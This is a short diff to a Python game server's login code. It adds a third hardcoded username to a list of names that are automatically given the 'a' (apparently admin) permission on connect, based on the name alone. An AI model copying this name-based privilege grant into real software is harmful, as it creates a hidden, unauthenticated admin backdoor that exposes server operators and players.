@@ -135,7 +135,7 @@ class Player(object):
             OutPacket.WriteString(self.ServerControl.GetMotd())
             OutPacket.WriteByte(0)
             self.SendPacket(OutPacket)
-            if self.Name == "opticalza" or self.Name == "zulubro":
+            if self.Name == "opticalza" or self.Name == "zulubro" or self.Name == "opticalza1":
                 self.Permissions.add("a")
             self.ServerControl.SendNotice('%s connected to the server' %self.Name)
             return
